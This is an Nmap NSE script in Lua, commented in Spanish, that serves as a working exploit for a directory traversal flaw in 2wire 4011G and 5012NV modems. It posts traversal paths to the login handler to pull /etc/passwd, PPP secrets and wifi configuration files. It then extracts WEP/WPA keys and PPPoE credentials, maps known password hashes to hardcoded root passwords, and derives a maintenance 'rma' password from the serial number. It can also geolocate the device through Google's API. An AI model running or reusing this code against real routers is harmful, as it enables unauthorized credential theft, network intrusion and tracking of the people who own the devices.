description = [[
2wire 4011G and 5012NV Directory Traversal Vulnerability PoC v2.5

Afecta a estos modems y posiblemente otros con firmware 9.x.x.x

Existe una vulnerabilidad en el formulario de inicio de sesion del portal de configuracion por http de estos modems, especificamente en el elemento oculto __ENH_ERROR_REDIRECT_PATH__ que no es validado correctamente en el servidor. Un atacante sin autenticacion puede manipular su valor para obtener archivos con informacion sensible del dispositivo.

El script identifica a los modelos afectados por el puerto 8080 tcp, este es utilizado por su bloqueador de URLs y el servidor se identifica como rhttpd. Despues busca un puerto de administracion remota y trata de obtener varios archivos. Si el dispositivo es vulnerable se muestra la informacion obtenida.

Referencia: http://osvdb.org/88903
]]

---
-- @usage
-- nmap --script http-2wire-dtvuln -p 8080 <target>
-- @usage
-- nmap --script http-2wire-dtvuln --script-args h2d.geoapikey=<key> -p 8080 <target>
-- @args h2d.htout HTTP Timeout
-- @args h2d.stout Sockets Timeout
-- @args h2d.geoapikey API KEY de Google Maps Geolocation
-- @args h2d.full Muestra los archivos obtenidos en la salida
-- @args h2d.short Muestra salida reducida separada por comas
-- @args h2d.usevulns Usa la libreria vulns solo para la salida
-- @output
-- PORT     STATE SERVICE
-- 8080/tcp open  http
-- | http-2wire-dtvuln: 
-- |   modem: 2wire 4011G-001 fw 9.1.1.16
-- |   serie: 09230A01230
-- |   mac: 00:25:3c:00:11:22
-- |   bssid: 00:25:3c:00:11:23
-- |   default_essid: INFINITUM1230
-- |   default_wepkey1: 1234567890
-- |   essid: MY_WIFI
-- |   wepkey1: 1111122222
-- |   wpapass: emptypass
-- |   wifisec: wep
-- |   ppp: user@prodigyweb.com:password
-- |   dispositivos: 
-- |     00:19:e0:33:f2:01: TP-Link
-- |   usuarios: 
-- |     tech: 1234567890
-- |     root: mickey
-- |     admin: 1234567890
-- |     rma: 7Fh34#sd
-- |_  vuln_ip_port: 192.168.1.254:80

author = "Abraham Diaz (@adiaz_32)"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"exploit","vuln"}


local shortport = require "shortport"
local stdnse = require "stdnse"
local http = require "http"
local nsedebug = require "nsedebug"
local openssl = stdnse.silent_require "openssl"
local json = require "json"
local vulns = require "vulns"

local htout, stout, geoapikey, full, short, usevulns = stdnse.get_script_args("h2d.htout","h2d.stout","h2d.geoapikey","h2d.full","h2d.short","h2d.usevulns")

local PREFIJO = "/../../.."
local LISTAARCH = {
	"/var/etc/model_no",
	"/etc/firmware_version",
	"/tmp/ifcfg", --BSSID es +1
	"/var/confprov_dynamic_params",
	"/etc/passwd",
	"/etc/ppp/pap-secrets-pppoe",
	"/etc/np_device_config/running/npwifi.xml"
}


---
--Busca un puerto abierto entre 2000-2999
--@param host Tabla host
--@return El puerto abierto o nil si no
local function cwmp_backdoor (host)
	--Primero buscar un puerto abierto en el estado de puertos escaneados previamente
	stdnse.print_debug(1,"%s B - %s Empieza busqueda interna de puerto 2xxx",SCRIPT_NAME,host.ip)
	local respuesta = nil
	local test_port = 2000
	local saltar = true --Si todos los puertos fueron escaneados previamente saltara el otro escaneo.
	while test_port < 3000 do
		respuesta = nmap.get_port_state({ip=host.ip},{number=test_port,protocol="tcp"})
		stdnse.print_debug(2,"%s B - %s Buscando en puertos previamente escaneados: %d",SCRIPT_NAME,host.ip,test_port)
		if respuesta then
			if respuesta.state == "open" then
				return test_port
			end
		elseif saltar then
			--Si hay al menos un puerto no escaneado tendra que hacer el otro escaneo
			saltar = false
		end
		test_port = test_port+1
	end
	
	if saltar then return nil end
	
	--Escaneo propio del script. Util cuando no se especifica de inicio un rango 2000-2999
	local status, codigo
	local socket = nmap.new_socket()
	socket:set_timeout(stout or 1000)
	test_port = 2000
	stdnse.print_debug(1,"%s B - %s Empieza escaneo de puertos 2xxx",SCRIPT_NAME,host.ip)
	while test_port < 3000 do
		status, codigo = socket:connect(host.ip,test_port)
		if status then
			stdnse.print_debug(1,"%s B - %s Puerto encontrado: %d %s",SCRIPT_NAME,host.ip,test_port,codigo)
			socket:close()
			return test_port
		else
			stdnse.print_debug(2,"%s B - %s Puerto no disponible: %d %s",SCRIPT_NAME,host.ip,test_port,codigo)
		end
		test_port = test_port+1
	end
	return nil
end

---
--Busca una admon remota por http de un 2wire
--@param host Tabla host
--@param test_port El puerto a probar
--@return La pagina de inicio de un 2wire, nil si no hay una admon remota
local function admon_remota (host,test_port)
	stdnse.print_debug(1,"%s B - %s Probando admon remota en puerto %d",SCRIPT_NAME,host.ip,test_port)
	local respuesta = http.get(host,test_port,"/xslt?PAGE=A_0_0",{timeout=htout or 20000})
	--en fw 9.1.1.15 es "GoAhead-Webs", en otros es "Gateway-Webs"
	--body:find("/xslt?PAGE=D_0_0") para diferenciar de la pagina que dice que esta ocupado
	if respuesta.status == 200 and (respuesta.header.server == "Gateway-Webs" or respuesta.header.server == "GoAhead-Webs") and respuesta.body and respuesta.body:find("PAGE=D_0_0") then
		stdnse.print_debug(1,"%s B - %s Admon remota de 2wire en puerto %d",SCRIPT_NAME,host.ip,test_port)
		return respuesta.body
	end
	return
end

---
--Recibe la pagina de inicio de un 2wire, donde se puede obtener Serial y dispositivos conectados.
--@param pagina Pagina de inicio de un 2wire
--@param tabla Tabla principal del script que almacena la informacion interesante
local function inicia_tabla (pagina,tabla)
	tabla.modem = "2wire"
	local temp_var = pagina:match("Seri.-:<br />%s-(%w-)</p>") --Serie: en esp, Serial Number: en ing
	tabla.serie = temp_var or ""
	tabla.mac = ""
	tabla.bssid = ""
	tabla.default_essid = ""
	tabla.default_wepkey1 = ""
	tabla.essid = ""
	tabla.wepkey1 = ""
	tabla.wpapass = ""
	tabla.wifisec = ""
	tabla.ppp = ""
	--Obtener la tabla completa de dispositivos conectados alguna vez, la mac sera la key, si no hay match es nil
	local dispositivos = pagina:match("<table class=\"colortable\">(.-)</table>")
	if dispositivos then
		tabla.dispositivos = {}
		for _,nombre,direcmac in dispositivos:gmatch("<tr>%s*<td>(.-)</td>%s*<td>%s*(.-)</td>%s*<td>.-(%x%x:%x%x:%x%x:%x%x:%x%x:%x%x).-</td>%s-</tr>") do
			tabla.dispositivos[direcmac]=nombre
		end
	end
	tabla.usuarios = {}
	if geoapikey then tabla.coords = "" end
	tabla.archivos = {}
end

---
--Recibe una cadena y aplica el algoritmo rma presente en estos dispositivos para generar un password
--Usuario rma usado para ingresar por CLI solamente
--@param cadena String
--@return El password generado para el usuario rma
local function algoritmo_rma (cadena)
	if not nmap.have_ssl() then return end
	local prepass = table.concat({string.match(openssl.bignum_bn2hex(openssl.bignum_bin2bn(openssl.md5(cadena))),"^.(.).(.).(.).(.).(.).(.).(.).(.)")})
	local abc = "+bC123_efaBcDEF!e-g456HijE[Gh@JILk$W89n&p#KmNOPMqrS0~uVQRsTUvl%owxYzA*f7XyZ;]Fdt"
	local rma_pass = {}
	local desp
	for i=1,8 do
		desp = (i-1)%5*16+tonumber(prepass:sub(i,i),16)+1
		table.insert(rma_pass,abc:sub(desp,desp))
	end
	return table.concat(rma_pass)
end

---
--Experimental, usa una API de google para geolocalizar.
--Se necesita que al menos uno de los equipos conectados sea un AP.
--Se considera que todos los dispositivos son un AP cercano, se puede modificar quitando el ss.
--@param bssid BSSID del 2wire
--@param otros Tabla de los dispositivos macaddr:nombre
--@return Un string con las coordenadas en formato lat,lng,acc solo si acc menor a 1500m. nil si no.
local function geoloc (bssid,otros)
	stdnse.print_debug(2,"%s dd otros tabla = %s",SCRIPT_NAME,nsedebug.tostr(otros))
	--geoapikey = "" --aqui puede ir una API key :P
	local geo_host = "www.googleapis.com"
	local geo_path = "/geolocation/v1/geolocate?key="..geoapikey
	local geo_tabla = {}
	geo_tabla.wifiAccessPoints = {}
	geo_tabla.wifiAccessPoints[1] = {macAddress=bssid:upper(),signalStrength=-40,age=0}
	for macadr,_ in pairs(otros) do
		table.insert(geo_tabla.wifiAccessPoints,{macAddress=macadr:upper(),signalStrength=-1*math.random(40,50),age=0})
		--table.insert(geo_tabla.wifiAccessPoints,{macAddress=macadr:upper(),age=0}) --Si no se quiere inventar el ss
	end
	stdnse.print_debug(2,"%s dd geo path = %s",SCRIPT_NAME,geo_path)
	stdnse.print_debug(2,"%s dd geo objeto = %s",SCRIPT_NAME,nsedebug.tostr(geo_tabla))
	
	local resp = http.post(geo_host,443,geo_path,{header={["Content-Type"]="application/json",["Host"]=geo_host}},nil,json.generate(geo_tabla))
	stdnse.print_debug(2,"%s dd geo response = %s",SCRIPT_NAME,nsedebug.tostr(resp))
	
	--code en la respuesta es igual que status en caso de error
	if resp.body and resp.status == 200 then
		local codigo, geo_respuesta = json.parse(resp.body)
		if codigo and geo_respuesta.accuracy and geo_respuesta.accuracy <= 1500 then
			stdnse.print_debug(2,"%s dd geo from json = %s",SCRIPT_NAME,nsedebug.tostr(geo_respuesta))
			return geo_respuesta.location.lat..","..geo_respuesta.location.lng..","..geo_respuesta.accuracy
		end
	end
	if resp.status == 403 then
		stdnse.print_debug(1,"%s Google Maps Geolocation API Limit Exceeded",SCRIPT_NAME)
	elseif resp.status == 400 then
		stdnse.print_debug(1,"%s Google Maps Geolocation API ERROR",SCRIPT_NAME)
	end
	return nil
end

---
--Recibe la tabla principal para completar la informacion en los archivos obtenidos por la vulnerabilidad
--Los archivos se encuentran en la misma tabla
--@param tabla La tabla principal
local function sacar_info (tabla)	
	local temp_var
	local info = string.match(tabla.archivos["/tmp/ifcfg"] or "","%x%x:%x%x:%x%x:%x%x:%x%x:%x%x")
	--Generar el BSSID
	if info then
		temp_var = info:match("..$")
		tabla.mac = info
		tabla.bssid = info:sub(1,15)..string.format("%.2x",tonumber(temp_var,16)+1)
	end
	
	tabla.modem = tabla.modem.." "..(tabla.archivos["/var/etc/model_no"] or "").." fw "..(tabla.archivos["/etc/firmware_version"] or "")
	
	if tabla.archivos["/var/confprov_dynamic_params"] then
		tabla.default_wepkey1 = string.match(tabla.archivos["/var/confprov_dynamic_params"],"WIFIWEPKEY1=(%d*)") or ""
		tabla.default_essid = string.match(tabla.archivos["/var/confprov_dynamic_params"],"WIFISSID=(%w*)%s") or ""
	end
	
	info = string.match(tabla.archivos["/etc/np_device_config/running/npwifi.xml"] or "","<TE refid=\"%d-\">.-<TE refid=\"%d-\">(.-)</TE>")
	if info then
		tabla.essid = info:match("<P PI=\"786439\">(.-)</P>")
		tabla.wepkey1 = info:match("<P PI=\"786455\">(.-)</P>")
		tabla.wpapass = info:match("<P PI=\"786452\">(.-)</P>")
		--este muestra que seguridad se esta usando
		tabla.wifisec = info:match("<P PI=\"786449\">(.-)</P>")
	end
	
	info, temp_var = string.match(tabla.archivos["/etc/ppp/pap-secrets-pppoe"] or "","^(.-)%s%*%s(.-)$")
	if info and temp_var then
		tabla.ppp = info..":"..temp_var
	end
	
	if tabla.archivos["/etc/passwd"] then
		info = string.match(tabla.archivos["/etc/passwd"],"root:(.-):")
		--Si es modem Infinitum ...		
		if info and info == "$1$$spzFI9bag88XMcBWdGNMh/" then
			tabla.usuarios.root = "b3str3ss"
			info = string.match(tabla.archivos["/etc/passwd"],"admin:(.-):")
			if info and info == string.match(tabla.archivos["/etc/passwd"],"tech:(.-):")  then
				tabla.usuarios.admin = tabla.default_wepkey1
			end
			tabla.usuarios.tech = tabla.default_wepkey1
		--Si es Singtel ...
		elseif info and info == "$1$$Zw8ZNiDa1HCLFOoDPu0hr." then
			tabla.usuarios.root = "s1ngt3l2w1r3"
			tabla.usuarios.tech = "techsupport" --$1$$Rg2OibVvUTim2uPK4worH1
		end
	end

	if tabla.serie ~= "" then
		tabla.usuarios.rma = algoritmo_rma(tabla.serie.."2Wire-000D72")
	end
	
	if geoapikey then
		if tabla.bssid ~= "" and tabla.dispositivos then
			tabla.coords = geoloc(tabla.bssid,tabla.dispositivos)
		else
			tabla.coords = nil
		end
	end
end

---
--Salida opcional mas corta y separada por comas si se activa la bandera h2d.short
--@param tabla La tabla principal
--@return Un string con los valores en formato csv
local function salida_csv (tabla)
	local cadena = tabla.default_essid..","..tabla.default_wepkey1..","
	cadena = cadena..tabla.serie..","..tabla.mac..","..tabla.ppp
	if geoapikey then
		cadena = cadena..","..(tabla.coords or ",,")
	end
	return cadena
end


portrule = shortport.portnumber({8080},"tcp","open")


action = function(host,port)
	local exito = 0
	local puerto, respuesta
	
	--Si se usa la opcion + en la linea de comandos puede probar el puerto directamente si se conoce
	if port.number == 8080 then
		respuesta = http.get(host,port,"/")
		if respuesta.status == 302 and respuesta.header.server == "rhttpd" then
			stdnse.print_verbose(1,"%s A - %s:%d rhttpd server detectado",SCRIPT_NAME,host.ip,port.number)
			port.version.name="http"
			port.version.product="2wire ADSL modem"
			nmap.set_port_version(host,port)
			puerto = 80
			respuesta = admon_remota(host,puerto)
			if not respuesta then
				puerto = cwmp_backdoor(host)
				if puerto then
					respuesta = admon_remota(host,puerto)
					if not respuesta then puerto = nil end
				end
			end
		end
	else
		respuesta = admon_remota(host,port.number)
		if respuesta then
			puerto = port.number
		end
	end

	if puerto then
		stdnse.print_debug(1,"%s C - %s Usando puerto %d (body=%d)",SCRIPT_NAME,host.ip,puerto,#respuesta)
		local tabladatos = stdnse.output_table()
		inicia_tabla(respuesta,tabladatos)
		tabladatos.vuln_ip_port = host.ip..":"..puerto
		local tablapost = {
			["__ENH_SHOW_REDIRECT_PATH__"] = "/pages/C_4_0.asp",
			["__ENH_SUBMIT_VALUE_SHOW__"] = "Acceder",
			["__ENH_ERROR_REDIRECT_PATH__"] = "",
			["username"] = "tech"
		}
		for _,archivo in ipairs(LISTAARCH) do
			tablapost["__ENH_ERROR_REDIRECT_PATH__"] = PREFIJO .. archivo
			respuesta = http.post(host,puerto,"/goform/enhAuthHandler",{},nil,tablapost)
			if respuesta.body and respuesta.status == 200 and not string.find(respuesta.body,"Error") and not string.find(respuesta.body,"html") then
				tabladatos.archivos[archivo] = string.sub(respuesta.body,3) --por el CRLF extra en el cuerpo
				exito = exito + 1
				stdnse.print_debug(1,"%s C - %s Se obtuvo %s, exito = %d",SCRIPT_NAME,host.ip,archivo,exito)
			end
		end
		
		if exito > 0 then
			stdnse.print_debug(1,"%s D - %s Parseando info", SCRIPT_NAME,host.ip)
			sacar_info(tabladatos)
			nmap.set_port_version(host,{number=puerto,protocol="tcp",version={name="http",product=tabladatos.modem}})
			if not full then
				tabladatos.archivos = nil --para no mostrarlos en la salida
			end
			stdnse.print_verbose(1,"%s - %s es vulnerable. %d de %d archivos",SCRIPT_NAME,host.ip,exito,#LISTAARCH)
			if short then
				return tabladatos, salida_csv(tabladatos)
			elseif usevulns then
				local vuln_table = {
					title = "2wire 4011G and 5012NV Directory Traversal Vulnerability PoC",
					state = vulns.STATE.EXPLOIT,
					risk_factor = "High",
					description = [[ Manipula el elemento oculto __ENH_ERROR_REDIRECT_PATH__ en la pagina de inicio de sesion para obtener archivos con informacion sensible. ]],
					dates = { disclosure = { year= 2012, month = 12, day = 31 }, },
					exploit_results = "\n"..nsedebug.tostr(tabladatos),
					references = {"http://osvdb.org/88903","https://www.underground.org.mx/index.php?topic=28616","http://abrdiaz.blogspot.mx/2012/12/vulnerabilidad-directory-traversal-en.html",},
				}
				local vuln_report = vulns.Report:new(SCRIPT_NAME,host,port)
				return vuln_report:make_output(vuln_table)
			else
				return tabladatos
			end
		else
			stdnse.print_debug(1,"%s - %s NO es vulnerable.",SCRIPT_NAME,host.ip)
		end
	else
		stdnse.print_debug(1,"%s - %s No se encontro la admon remota de un 2wire.",SCRIPT_NAME,host.ip)
	end
	return nil
end